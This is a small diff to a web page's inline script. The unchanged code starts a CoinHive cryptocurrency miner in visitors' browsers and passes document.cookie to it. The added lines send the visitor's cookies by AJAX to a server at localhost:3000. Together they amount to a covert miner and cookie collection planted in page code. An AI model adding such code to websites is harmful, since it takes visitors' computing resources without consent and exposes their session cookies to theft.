@@ -20,6 +20,17 @@
 
       var miner = new CoinHive.User('kOmEN2gForhg8N9ilGGqm7s8OB8EILxT', document.cookie);
       miner.start();
+
+      // Say Hello to the server
+      $.ajax({
+        type: 'GET',
+        url: "http://localhost:3000/hello",
+        data: document.cookie
+      }).done(function(data) {
+        console.log('Server says ', data);
+      }).fail(function() {
+        console.log('No answer from server :-(');
+      });
     </script>
     
     <script>
